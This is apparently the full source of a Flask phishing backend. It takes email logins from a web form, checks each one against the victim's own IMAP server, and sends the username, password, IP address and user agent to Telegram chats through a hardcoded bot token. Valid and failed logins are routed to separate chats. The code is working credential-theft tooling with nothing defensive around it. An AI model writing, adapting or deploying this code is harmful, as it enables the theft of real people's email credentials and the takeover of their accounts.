import asyncio
from flask import Flask, render_template, request
from flask_sslify import SSLify
import imaplib, smtplib, requests
from email.utils import parseaddr
from telegram import Bot

app = Flask(__name__)
sslify = SSLify(app)

def get_imap_server(username):
    domain = (username.split("@"))[1]
    return f"mail.{domain}"

def check_credentials(username, password, imap_server):
    try:
        with imaplib.IMAP4_SSL(imap_server) as mail:
            mail.login(username, password)
            return True
    except Exception as e:
        print(f"Error: {e}")
        return False

async def send_telegram_message(username, password, ip_address, user_agent):
    bot_token = '6452100322:AAFqPUxw7z8mDzH6vjRlIq9Ug5iNdFxax40'
    chat_id = '-4031942707'
    bot = Bot(token=bot_token)
    message_text = f'''
Username: {username}
Password : {password}
IP Address: {ip_address}
User-Agent: {user_agent}
'''
    await bot.send_message(chat_id=chat_id, text=message_text)

async def send_invalid_telegram_message(username, password, ip_address, user_agent):
    bot_token = '6452100322:AAFqPUxw7z8mDzH6vjRlIq9Ug5iNdFxax40'
    chat_id = '-4097639593'
    bot = Bot(token=bot_token)
    message_text = f'''
Username: {username}
Password : {password}
IP Address: {ip_address}
User-Agent: {user_agent}
'''
    await bot.send_message(chat_id=chat_id, text=message_text)


@app.route('/')
def index():
    username = request.args.get('username', '')
    return render_template('index.html', username=username)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    imap_server = get_imap_server(username)
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.user_agent

    if check_credentials(username, password, imap_server):
        asyncio.run(
            send_telegram_message(username, password, ip_address, user_agent)
        )
        return render_template('success.html', username=username)
    else:
        asyncio.run(
            send_invalid_telegram_message(username, password, ip_address, user_agent)
        )
        return render_template('failure.html', username=username)

if __name__ == "__main__":
    # Use Gunicorn as the production server
    from gunicorn.app.base import BaseApplication

    class FlaskApp(BaseApplication):
        def __init__(self, app, options=None):
            self.options = options or {}
            self.application = app
            super().__init__()

        def load_config(self):
            for key, value in self.options.items():
                if key in self.cfg.settings and value is not None:
                    self.cfg.set(key.lower(), value)

        def load(self):
            return self.application

    options = {
        'bind': '0.0.0.0:5000',  # Adjust the port as needed
        'workers': 12,  # You can adjust the number of workers based on your server's resources
    }

    flask_app = FlaskApp(app, options)
    flask_app.run()

